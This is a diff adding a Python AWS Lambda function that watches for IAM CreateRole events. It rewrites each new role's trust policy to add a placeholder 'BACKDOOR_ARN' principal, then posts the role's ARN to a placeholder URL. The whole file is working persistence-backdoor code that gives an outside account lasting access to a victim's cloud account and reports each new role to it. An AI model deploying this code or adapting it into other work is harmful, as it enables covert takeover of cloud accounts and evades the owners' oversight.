@@ -1,0 +1,34 @@
+import boto3
+import urllib3
+import json
+http = urllib3.PoolManager()
+
+def lambda_handler(event,context):
+    if event['detail']['eventName']=='CreateRole':
+        name=event['detail']['requestParameters']['roleName']
+        iam=boto3.resource('iam')
+        role=iam.Role(name)
+        original=role.assume_role_policy_document
+        new=handle_change(original)
+        client=boto3.client('iam')
+        response=client.update_assume_role_policy(RoleName=name,PolicyDocument=json.dumps(new))
+        data={"RoleArn":event['detail']['responseElements']['role']['arn']}
+        r=http.request('POST', 'POST_URL', headers = {'Content-Type': 'application/json'}, body=json.dumps(data))
+    return
+def handle_change(original):
+    arn='BACKDOOR_ARN'
+    if 'Statement' in original:
+        statements=original['Statement']
+        for statement in statements:
+            if 'Effect' in statement and statement['Effect']=='Allow':
+                if 'Principal' in statement and isinstance(statement['Principal'],dict):
+                    if 'AWS' in statement['Principal']:
+                        if isinstance(statement['Principal']['AWS'],list):
+                            statement['Principal']['AWS'].append(arn)
+                        else:
+                            statement['Principal']['AWS']=[statement['Principal']['AWS'],arn]
+                    else:
+                        statement['Principal']['AWS']=arn
+                elif 'Principal' not in statement:
+                    statement['Principal']={'AWS':arn}
+    return original
